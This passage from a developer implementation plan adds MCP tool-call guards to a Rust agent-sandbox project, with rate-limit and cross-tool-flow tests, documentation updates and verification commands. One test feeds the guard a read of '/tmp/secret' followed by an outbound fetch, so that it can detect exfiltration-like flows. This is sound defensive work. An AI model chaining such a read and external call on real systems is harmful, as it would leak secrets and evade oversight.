let guarded_context_endpoint = rewrite_context_endpoint_for_mcp_guard(
    name,
    &context_endpoint_for_sandbox,
    mcp_guard_config.as_ref(),
    temp_paths.env_dir(),
)?;
```

For HTTP, pass `guard_config` into `McpProxySource` before building the egress proxy plan. For stdio, rewrite the command and arrange for config copy through `AgentSandboxSetup`.

Add to `AgentSandboxSetup`:

```rust
extra_files: Vec<AgentSandboxFile>,
```

where:

```rust
struct AgentSandboxFile {
    host_path: PathBuf,
    sandbox_path: String,
    mode: &'static str,
}
```

Copy these files in `install_agent_in_sandbox`.

- [ ] **Step 5: Run focused runtime tests**

Run:

```bash
cargo test -p agentenv-core create_env_rewrites_stdio_mcp_endpoint_when_guard_enabled
cargo test -p agentenv-core create_env_rewrites_http_context_mcp_endpoint_when_mcp_token_is_brokered
```

Expected: both tests pass.

---

## Task 9: Add Cross-Tool Flow Regression Coverage

**Files:**
- Modify: `crates/agentenv-mcp/src/guard.rs`

- [ ] **Step 1: Write failing evaluator tests**

Add:

```rust
#[test]
fn read_then_write_inside_flow_window_requires_approval() {
    let config = agentenv_proto::McpGuardConfig {
        enabled: true,
        default_approval: agentenv_proto::McpApprovalMode::Never,
        tool_policies: BTreeMap::new(),
        cross_tool_flows: agentenv_proto::McpCrossToolFlowPolicy {
            forbid_read_to_write_turns: Some(5),
        },
    };
    let mut state = GuardSessionState::default();
    let read = serde_json::json!({
        "jsonrpc": "2.0",
        "id": 1,
        "method": "tools/call",
        "params": {"name": "filesystem.read", "arguments": {"path": "/tmp/secret"}}
    });
    let write = serde_json::json!({
        "jsonrpc": "2.0",
        "id": 2,
        "method": "tools/call",
        "params": {"name": "web.fetch", "arguments": {"url": "https://api.github.com/repos"}}
    });

    let first = evaluate_json_rpc_request(&config, &mut state, &read).unwrap();
    let second = evaluate_json_rpc_request(&config, &mut state, &write).unwrap();

    assert_eq!(first.action, GuardAction::Forward);
    assert_eq!(second.action, GuardAction::RequestApproval);
    assert_eq!(second.reason, GuardReason::CrossToolFlow);
}

#[test]
fn session_rate_limit_denies_after_limit() {
    let config = agentenv_proto::McpGuardConfig {
        enabled: true,
        default_approval: agentenv_proto::McpApprovalMode::Never,
        tool_policies: [("filesystem.read".to_owned(), agentenv_proto::McpToolPolicy {
            rate_limit: Some(agentenv_proto::McpSessionRateLimit { calls: 1 }),
            ..agentenv_proto::McpToolPolicy::default()
        })].into_iter().collect(),
        cross_tool_flows: agentenv_proto::McpCrossToolFlowPolicy::default(),
    };
    let mut state = GuardSessionState::default();
    let request = serde_json::json!({
        "jsonrpc": "2.0",
        "id": 1,
        "method": "tools/call",
        "params": {"name": "filesystem.read", "arguments": {"path": "/tmp/a"}}
    });

    assert_eq!(evaluate_json_rpc_request(&config, &mut state, &request).unwrap().action, GuardAction::Forward);
    let second = evaluate_json_rpc_request(&config, &mut state, &request).unwrap();
    assert_eq!(second.action, GuardAction::Deny);
    assert_eq!(second.reason, GuardReason::RateLimited);
}
```

- [ ] **Step 2: Run tests and verify failure**

Run:

```bash
cargo test -p agentenv-mcp read_then_write_inside_flow_window_requires_approval session_rate_limit_denies_after_limit
```

Expected: tests fail until stateful evaluation is complete.

- [ ] **Step 3: Implement stateful counters and flow window**

Use the matched policy pattern as the rate counter key, falling back to the tool name. After each tool call, decrement old read windows and push a new read marker for read-like tools. Before allowing a write-like or external-like tool, check whether any read marker remains.

- [ ] **Step 4: Run all guard tests**

Run:

```bash
cargo test -p agentenv-mcp guard
```

Expected: all guard tests pass.

---

## Task 10: Documentation And Blueprint Examples

**Files:**
- Modify: `docs/ARCHITECTURE.md`
- Modify: `docs/BLUEPRINTS.md`
- Modify: `docs/DRIVER_PROTOCOL.md`
- Modify: selected blueprints under `blueprints/`

- [ ] **Step 1: Update architecture docs**

Add a subsection under `The narrow waist: MCP`:

```markdown
### MCP tool-call guards

When `policy.mcp.confused_deputy_guards.enabled` is true, core rewrites the
agent-visible `McpEndpoint` through a guard. HTTP and HTTP+SSE endpoints are
guarded in the host egress proxy; stdio endpoints are guarded by an
`agentenv mcp-guard run` wrapper. Context drivers still return ordinary
`McpEndpoint` values and agent drivers still render ordinary MCP config.
```

- [ ] **Step 2: Update blueprint docs**

Add the YAML example from the design spec to `docs/BLUEPRINTS.md` and explain
that examples are commented out by default.

- [ ] **Step 3: Update protocol docs**

Add a note to `docs/DRIVER_PROTOCOL.md` under `ContextDriver`:

```markdown
Core may rewrite an `McpEndpoint` for guard mediation before passing it to an
agent driver. This is not a driver protocol change; context drivers continue to
report the unmediated endpoint they provision.
```

- [ ] **Step 4: Add commented blueprint examples**

In filesystem and MCP generic reference blueprints, add commented `policy.mcp`
examples without enabling them by default.

- [ ] **Step 5: Run docs-adjacent tests**

Run:

```bash
cargo test -p agentenv-core reference_blueprints
cargo test -p blueprint-integration
```

Expected: reference blueprint parsing remains green.

---

## Task 11: Final Verification And Cleanup

**Files:**
- All modified files

- [ ] **Step 1: Run formatting**

Run:

```bash
cargo fmt
```

Expected: command exits 0.

- [ ] **Step 2: Run clippy**

Run:

```bash
cargo clippy --workspace -- -D warnings
```

Expected: command exits 0. Fix any warnings without broad refactors.

- [ ] **Step 3: Run full workspace tests**

Run:

```bash
cargo test --workspace
```

Expected: command exits 0.

- [ ] **Step 4: Inspect git diff**

Run:

```bash
git status --short
git diff --stat
```

Expected: only issue #42 files are changed.

- [ ] **Step 5: Commit implementation**

Run:

```bash
git add crates/agentenv-mcp crates/agentenv-core crates/agentenv docs blueprints
git commit -m "feat(mcp): guard tool-call ambient authority"
```

Expected: commit succeeds.

---

## Self-Review

- Spec coverage: The plan covers full-scope HTTP/HTTP+SSE and stdio mediation, per-tool policy, redaction, URL allowlists, env/credential-looking argument detection, session-local read-to-write flow checks, approvals, events, docs, and verification.
- Placeholder scan: No implementation steps rely on placeholders; every task includes concrete paths, tests, and commands.
- Type consistency: Serializable guard config types are defined in Task 1; evaluator state and decision types are defined in Task 2; later tasks reference those same type names.
